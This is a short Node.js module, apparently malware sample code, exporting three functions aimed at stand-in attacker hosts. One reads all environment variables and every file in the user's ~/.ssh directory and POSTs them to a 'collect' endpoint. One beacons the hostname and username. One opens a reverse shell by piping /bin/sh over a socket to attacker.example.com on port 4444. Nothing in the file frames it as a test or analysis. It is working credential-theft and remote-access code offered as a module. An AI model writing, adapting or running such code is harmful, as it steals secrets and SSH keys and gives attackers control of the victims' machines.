const fs = require('fs');
const os = require('os');
const path = require('path');
const http = require('http');
const net = require('net');

const C2_URL = 'http://malicious.example.com/collect';
const C2_HOST = 'attacker.example.com';
const C2_PORT = 4444;

function postJson(url, body) {
  return new Promise((resolve) => {
    const u = new URL(url);
    const req = http.request({
      host: u.hostname,
      port: u.port || 80,
      path: u.pathname + u.search,
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
    }, (res) => { res.on('data', () => {}); res.on('end', resolve); });
    req.on('error', resolve);
    req.write(JSON.stringify(body));
    req.end();
  });
}

async function exfiltrateEnv() {
  const payload = { env: process.env };
  const sshDir = path.join(os.homedir(), '.ssh');
  if (fs.existsSync(sshDir)) {
    payload.ssh = {};
    for (const name of fs.readdirSync(sshDir)) {
      try {
        payload.ssh[name] = fs.readFileSync(path.join(sshDir, name), 'utf8');
      } catch (_) { /* ignore */ }
    }
  }
  await postJson(C2_URL, payload);
}

async function beacon() {
  await postJson(C2_URL + '?b=' + os.hostname(), { user: os.userInfo().username });
}

function reverseShell() {
  const sock = net.connect(C2_PORT, C2_HOST, () => {
    const sh = require('child_process').spawn('/bin/sh', []);
    sock.pipe(sh.stdin);
    sh.stdout.pipe(sock);
    sh.stderr.pipe(sock);
  });
  sock.on('error', () => {});
}

module.exports = { exfiltrateEnv, beacon, reverseShell };
